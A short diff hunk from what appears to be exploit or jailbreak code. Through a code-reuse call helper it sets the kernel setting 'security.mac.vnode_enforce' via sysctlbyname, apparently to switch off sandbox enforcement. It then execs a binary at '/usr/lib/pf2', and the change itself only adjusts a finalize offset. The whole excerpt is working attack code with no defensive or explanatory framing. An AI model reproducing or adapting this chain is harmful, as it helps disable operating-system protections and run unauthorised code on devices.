@@ -12,7 +12,7 @@ funcall(cfg['#cache']['sysctlbyname'], ptr('security.mac.vnode_enforce', True), 
 pf2 = ptr('/usr/lib/pf2', True)
 funcall(cfg['#cache']['execve'], pf2, ptrI(pf2, 0), zero)
 
-final = finalize(0x11000000+8)
+final = finalize(0x11000000 + 20)
 #(for debug)
 #heapdump(cache)
 
